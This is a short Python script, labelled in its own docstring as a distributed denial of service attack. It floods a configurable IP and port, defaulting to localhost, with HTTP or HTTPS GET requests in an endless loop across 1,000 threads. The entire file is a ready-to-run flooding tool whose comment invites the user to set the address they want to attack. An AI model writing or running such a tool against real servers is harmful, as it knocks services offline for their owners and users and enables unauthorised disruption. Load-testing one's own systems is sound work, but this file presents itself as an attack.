"""
author: Tony Code

distributed denial of service attack(ddos)
"""
import ssl
import socket
from threading import Thread


# the IP and port you want to attack
URL = '127.0.0.1:9999'


def header_dict2str(data):
    string = ''
    for key in data:
        string = string + str(key) + ': ' + str(data[key]) + '\r\n'
    return string

def get(url, header):
    request = 'GET / HTTP/1.1\r\n'
    request += header_dict2str(header)
    request += '\r\n'
    return request

def get_attack(url, protocol, header):
    # parsing url
    host, port = url.split(':')
    addr = (host, int(port))

    # get request
    request = get(url, header)

    # build tcp link
    if protocol == 'http':
        tcp_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    elif protocol == 'https':
        tcp_client_socket = ssl.wrap_socket(socket.socket(socket.AF_INET,
                                                          socket.SOCK_STREAM))
    tcp_client_socket.connect(addr)

    # send request
    tcp_client_socket.send(request.encode('utf-8'))
    

def attack(url, protocol, header):
    # send GET request continuously
    print("start attacking")
    while True:
        get_attack(url, protocol, header)
        
def ddos(attack, url, protocol, header, num=100):
    # multiple threading ddos attack
    t = []

    for i in range(num):
        t.append(Thread(target=attack, args=[url,protocol, header]))

    for thread in t:
        thread.start()

    for thread in t:
        thread.join()

        
def main():
    header = {'Host':URL,
              'Connection': 'close'}
    ddos(attack, URL, 'http', header, 1000)

if __name__ == '__main__':
    main()

